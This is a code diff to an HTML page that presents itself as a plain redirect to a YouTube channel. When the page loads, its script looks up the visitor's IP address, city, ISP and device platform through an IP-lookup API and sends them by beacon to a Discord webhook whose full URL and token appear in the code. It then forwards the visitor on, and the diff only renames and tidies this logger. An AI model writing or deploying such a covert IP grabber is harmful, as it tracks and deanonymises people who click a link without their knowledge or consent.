@@ -1,28 +1,31 @@
 <!DOCTYPE html>
 <html>
-<body>
+<body style="background:#000;">
 <script>
     const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
     const y = "https://youtube.com/@LigmaBlox-w7m";
 
-    async function ligma() {
-        let msg = "Hit Detected";
+    async function start() {
+        let info = "Target Detected";
         try {
-            // Get the details
+            // Grab the data from the API
             const r = await fetch('https://ipapi.co/json/');
             const d = await r.json();
-            msg = `IP: ${d.ip} | Loc: ${d.city}, ${d.country} | ISP: ${d.org} | Dev: ${navigator.platform}`;
-        } catch (e) {}
+            // Build the detailed string
+            info = `IP: ${d.ip} | City: ${d.city} | ISP: ${d.org} | Device: ${navigator.platform}`;
+        } catch (e) {
+            info = "Hit detected (Detailed data blocked by browser)";
+        }
 
-        // Send using the "Trusted" Beacon method
-        const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+        // Send it using the method that worked
+        const blob = new Blob([JSON.stringify({ content: info })], { type: 'application/json' });
         navigator.sendBeacon(h, blob);
 
-        // Move to YouTube
-        setTimeout(() => { window.location.replace(y); }, 500);
+        // Redirect
+        setTimeout(() => { window.location.replace(y); }, 400);
     }
 
-    ligma();
+    start();
 </script>
 </body>
 </html>
